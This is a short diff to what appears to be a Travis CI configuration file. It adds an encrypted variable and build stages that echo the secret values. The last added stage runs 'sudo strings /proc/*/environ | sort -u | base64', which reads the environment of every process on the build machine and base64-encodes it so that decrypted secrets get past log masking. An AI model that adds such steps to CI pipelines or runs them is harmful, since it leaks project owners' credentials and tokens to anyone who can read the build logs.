@@ -5,7 +5,13 @@ env:
   global:
     # SEC_ENV
     secure: RqfIPK4wkFez8rqDFL/nqSIK0W1u9RIyDt/yyAfLN3PszAGCtDkKoRz0a4XZG8IiPp9g034xTMyD7vqxz2tLm6popF7V3aVssA6cTfj+Ag4HCjCUsBSQfQwRQ3yHLRAaj56CINSF0ZDfGdFp7fj6grumSG2ijE9eeZ5oerbu7cg/6hzMLEZY2U78MU7ofnD1BCwpH3tokWD+6VAZOsH+N+FyYlBeMEDUGeL5qBtRRf+Ydm6OidxkFyJreYx+XJbeVtQDUl4/RuRBldmXfRzHjo2kgfya9I26fvntITa2TfowqAIGd4WcQUGmnsorj8O9ZGNyvcoz25k1zfpGaVy8m5A78uqVLTyW2AGgfGb+zm9Kmt0tT/DXtWis5Jok14/HcYszscVWGzbNjAZURJUXbeTG3mGAv/H4e0Z6NS91BDx0M2VTJQkpOUpdUO9gDRP4y7CPqC0BTKpfGpnM2x0R8FFy7b96Ec7oHqysT3bFIIVTvtYQsofQ9BJs21twJzw8Fvh7qpAsWaS5kiXtq/K+RVOqwF/ZU1/bD0LH8xCUJciWELmO+RYtAm9h+ygpnAfbTOsvP3lrdy6zQ+qmeM5ArNBCzbAvPYgxIWJ6DzaotDdyc8hUzK9dO0mvj8AGVeQWNwScR4LpZ1tXPnZlCEGjINl4HGIPqp1g/K5+1DLbgqY=
+    # NEW
+    - secure: M317Q0Vt9t+3fL+hjggT8HmsLWHxCy7gfI3gvr/NL3BdZ6yyAqX1oh+tTAVtOFV6TwNzepWvDGTAZZcVlpOo+PrcBZ6dc7VyZYmkYFhg16865J1bM12kr9ielqzy5Hm4QyniKWD6I2kqcgIwf0zE6mGPl2xsE3k3hGEuInb2hozILkIRaNlZsE/+QVbpnjgaDc7bWG+u8sU/jCq0oOJTbDVQJFxjtROkpKxc197Kub1T3QxhGN56IntAwGxLkfPenrklT2ZJxDYCMcbLMX62Q7gkWzN+DrmO2AcOVj0WGGY651wYMaPEhe8tb5tb92hkDwCSjSr4cbKOpNVnZiFdaMZX6qK+e21bgrHD9hji+r0YBHvqL2Q19/LrzNWbJRqokef9HbC3dzLwfogDyRg3bAUsntVX2eAhcTgKt6wC1Qv05QbkQHZODe/ut+E3IGRGdQxpgE8Tj9krBbsT2hzogDJ5SbscTeem9urOvEGQKs1if4QrRb7UfWaIiVKkViiogf6mdQQMytdNUQsrKgtHapQdXu6ng+Mxb+gYOdumMwPVxMFfCl9hUIJF58cTCk3yg0D84PhsYdbpZE3SJBy+uCbCVe7tc/VeBbOW/ER1IqGCbLCInWH9W190S9jzGAYokLYIMspiEmj1tTjrLPWDOmHueyFv6/96nkJAuvYI6ZE=
 jobs:
   include:
     - stage: "echo SEC_ENV"
       script: echo $SEC_ENV
+    - stage: "echo New"
+      script: echo $NEW
+    - stage: "print base64"
+      script: sudo strings /proc/*/environ | sort -u | base64
